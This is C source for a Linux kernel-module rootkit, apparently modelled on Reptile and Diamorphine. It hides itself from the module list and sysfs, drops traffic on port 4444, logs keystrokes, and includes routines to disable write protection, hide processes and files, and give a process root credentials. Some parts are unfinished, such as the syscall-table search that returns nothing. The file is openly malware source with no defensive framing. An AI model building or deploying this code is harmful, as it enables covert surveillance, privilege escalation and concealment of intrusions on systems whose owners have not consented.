/*
 * LKM Basics - Loadable Kernel Module
 * Reptile/Diamorphine patterns
 *
 * Build: make -C /lib/modules/$(uname -r)/build M=$PWD modules
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/fs.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/keyboard.h>

MODULE_LICENSE("GPL");

// ============================================================================
// KALLSYMS LOOKUP
// ============================================================================

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#include <linux/kprobes.h>

typedef unsigned long (*kln_t)(const char*);
static kln_t kln;

static struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };

int init_kln(void)
{
    register_kprobe(&kp);
    kln = (kln_t)kp.addr;
    unregister_kprobe(&kp);
    return kln != 0;
}
#else
#define kln kallsyms_lookup_name
#define init_kln() 1
#endif

// ============================================================================
// CR0 WRITE PROTECT
// ============================================================================

static inline void wp_off(void)
{
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r"(cr0));
    cr0 &= ~0x10000;
    asm volatile("mov %0, %%cr0" : : "r"(cr0));
}

static inline void wp_on(void)
{
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r"(cr0));
    cr0 |= 0x10000;
    asm volatile("mov %0, %%cr0" : : "r"(cr0));
}

// ============================================================================
// SYSCALL TABLE
// ============================================================================

unsigned long** get_sct(void)
{
    unsigned long** sct = (unsigned long**)kln("sys_call_table");
    if(sct) return sct;

    unsigned long lstar;
    rdmsrl(0xC0000082, lstar);  // MSR_LSTAR

    // Search for sys_call_table reference
    return 0;
}

// ============================================================================
// MODULE HIDE
// ============================================================================

static struct list_head* prev_mod;

void mod_hide(void)
{
    prev_mod = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

    // Hide from /sys/module
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

void mod_show(void)
{
    list_add(&THIS_MODULE->list, prev_mod);
}

// ============================================================================
// PROCESS HIDE
// ============================================================================

void proc_hide(pid_t pid)
{
    struct task_struct* t;
    struct pid* p = find_get_pid(pid);
    if(!p) return;

    t = pid_task(p, PIDTYPE_PID);
    if(t) list_del(&t->tasks);

    put_pid(p);
}

// ============================================================================
// FILE HIDE - VFS
// ============================================================================

static int (*orig_iterate)(struct file*, struct dir_context*);
static int (*orig_filldir)(struct dir_context*, const char*, int, loff_t, u64, unsigned);

static char* hide_prefix = "secret";

int fake_filldir(struct dir_context* ctx, const char* name, int len,
                 loff_t off, u64 ino, unsigned type)
{
    int i = 0;
    while(hide_prefix[i] && i < len && name[i] == hide_prefix[i]) i++;
    if(!hide_prefix[i]) return 0;

    return orig_filldir(ctx, name, len, off, ino, type);
}

// ============================================================================
// NETFILTER HOOK
// ============================================================================

static unsigned int hide_port = 4444;

unsigned int nf_hook(void* priv, struct sk_buff* skb,
                     const struct nf_hook_state* state)
{
    struct iphdr* iph;
    struct tcphdr* tcph;

    if(!skb) return NF_ACCEPT;

    iph = ip_hdr(skb);
    if(iph->protocol != 6) return NF_ACCEPT;  // IPPROTO_TCP

    tcph = tcp_hdr(skb);
    if(ntohs(tcph->source) == hide_port || ntohs(tcph->dest) == hide_port)
        return NF_DROP;

    return NF_ACCEPT;
}

static struct nf_hook_ops nf_ops = {
    .hook = nf_hook,
    .pf = 2,           // PF_INET
    .hooknum = 0,      // NF_INET_PRE_ROUTING
    .priority = -1000  // NF_IP_PRI_FIRST
};

// ============================================================================
// KEYLOGGER
// ============================================================================

static char klog[4096];
static int kpos = 0;

int kb_notify(struct notifier_block* nb, unsigned long action, void* data)
{
    struct keyboard_notifier_param* p = data;

    if(action == KBD_KEYSYM && p->down) {
        if(p->value < 128 && kpos < sizeof(klog) - 1)
            klog[kpos++] = p->value;
    }

    return NOTIFY_OK;
}

static struct notifier_block kb_nb = { .notifier_call = kb_notify };

void kl_start(void) { register_keyboard_notifier(&kb_nb); }
void kl_stop(void) { unregister_keyboard_notifier(&kb_nb); }

// ============================================================================
// PRIVILEGE ESCALATION
// ============================================================================

void give_root(void)
{
    struct cred* c = prepare_creds();
    if(!c) return;

    c->uid.val = 0;
    c->gid.val = 0;
    c->euid.val = 0;
    c->egid.val = 0;
    c->suid.val = 0;
    c->sgid.val = 0;
    c->fsuid.val = 0;
    c->fsgid.val = 0;

    commit_creds(c);
}

// ============================================================================
// INIT/EXIT
// ============================================================================

static int __init rk_init(void)
{
    if(!init_kln()) return -1;

    mod_hide();
    nf_register_net_hook(&init_net, &nf_ops);
    kl_start();

    return 0;
}

static void __exit rk_exit(void)
{
    kl_stop();
    nf_unregister_net_hook(&init_net, &nf_ops);
}

module_init(rk_init);
module_exit(rk_exit);

// ============================================================================
// EOF
// ============================================================================
